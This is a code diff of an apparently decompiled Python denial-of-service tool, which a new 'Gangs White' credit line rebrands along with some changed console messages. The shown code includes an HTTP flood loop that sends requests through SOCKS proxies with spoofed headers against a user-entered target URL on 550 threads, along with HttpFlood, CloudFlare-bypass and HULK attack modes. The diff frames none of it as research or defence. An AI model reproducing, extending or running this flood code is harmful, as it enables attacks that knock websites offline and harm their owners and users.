@@ -1,4 +1,4 @@
-#Decompile By 1x019 @ July 12 2022
+#Decompile B Gangs White @ July 8 2022
 import os, sys, time, random, threading, urllib.request
 try:
     import requests, cfscrape, colorama, fake_useragent
@@ -1352,7 +1352,7 @@ else:
                 requestes.add_header('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8')
                 urllib.request.urlopen(requestes)
                 request_num += 1
-                print((Fore.GREEN + '[+] HTTP Flood ==> Requests %s -- Done %s --Proxy--| %s ' % (request_num, self.num, self.proxy)), end='')
+                print((Fore.BLUE + '[+] Gang-Send-Requests %s | Done %s Proxy | %s ' % (request_num, self.num, self.proxy)), end='')
 
         def run(self):
             self.Lock.acquire()
@@ -1404,8 +1404,8 @@ else:
             try:
                 url = input('[*] Target [VD : https://domain.com]: ')
                 num_threads = int(550)
-                choice = 'high anonymous http/https/sock4/sock5'
-                mode = input('[+] Methods HttpFlood[Y]/ CloudFlare[]: ')
+                choice = 'chosse Methods http/https/sock4/sock5'
+                mode = input('[+] Methods HttpFlood[Y]/ CloudFlare[N] / HULk [1]: ')
                 Flood_Mode = mode == 'Y' or True
                 if mode == '' or None:
                     Flood_Mode = False
@@ -1453,7 +1453,7 @@ else:
                         socks5.close()
                         out_socks5 = str('socks5.txt')
                         proxies_socks5 = open(out_socks5).readlines()
-                        print(Fore.YELLOW + '[+] Number Of Socks5 Proxies: %s Live High Anonymous. ' % len(proxies_socks5))
+                        print(Fore.YELLOW + '[+] Socks5 Proxies: %s Live High Anonymous. ' % len(proxies_socks5))
                         in_proxies = open('socks5.txt', 'r')
 
             except:
@@ -1465,7 +1465,7 @@ else:
                         Requests(url, i + 1, in_line, choice, mode).start()
                         in_line = in_line[:-1]
                     except Exception:
-                        print(Fore.YELLOW + "[-] Can't connect The Url or Choice error ,Check again !!!")
+                        print(Fore.RED + "[-] Can't connect The Url or Choice error ,Check again !!!")
                         time.sleep(10)
 
 
